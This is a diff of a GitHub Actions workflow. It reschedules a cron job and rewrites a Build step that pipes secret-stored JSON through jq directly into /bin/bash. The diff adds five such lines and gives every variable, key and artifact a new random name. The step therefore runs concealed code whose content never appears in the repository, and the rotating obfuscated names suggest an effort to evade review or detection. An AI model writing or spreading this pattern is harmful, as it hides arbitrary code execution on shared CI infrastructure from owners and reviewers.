@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '33 2,8,14,20 * * *'
+    - cron: '43 5,11,17,23 * * *'
 env:
   CI: true
 concurrency:
@@ -19,14 +19,17 @@ jobs:
           fetch-depth: 1
       - name: Build
         env:
-          mtq03000: ${{ secrets.mtq03000 }}
+          aca369: ${{ secrets.aca369 }}
         run: |
-          printf '%s' "$mtq03000" | jq -r .njtpw07 | /bin/bash
-          printf '%s' "$q5907" | jq -r .ap1141 | /bin/bash
+          printf '%s' "$aca369" | jq -r .r64279 | /bin/bash
+          echo $jgxbi9 | jq -r .lg7854 | /bin/bash
+          printf '%s' "$j8386" | jq -r .hrwxt1014 | /bin/bash
+          echo $mthl731 | jq -r .r722 | /bin/bash
+          printf '%s' "$sy77" | jq -r .erecg7 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
         with:
-          name: mALNNDe5
+          name: CQewhEJW
           path: "*.zip"
           retention-days: 1
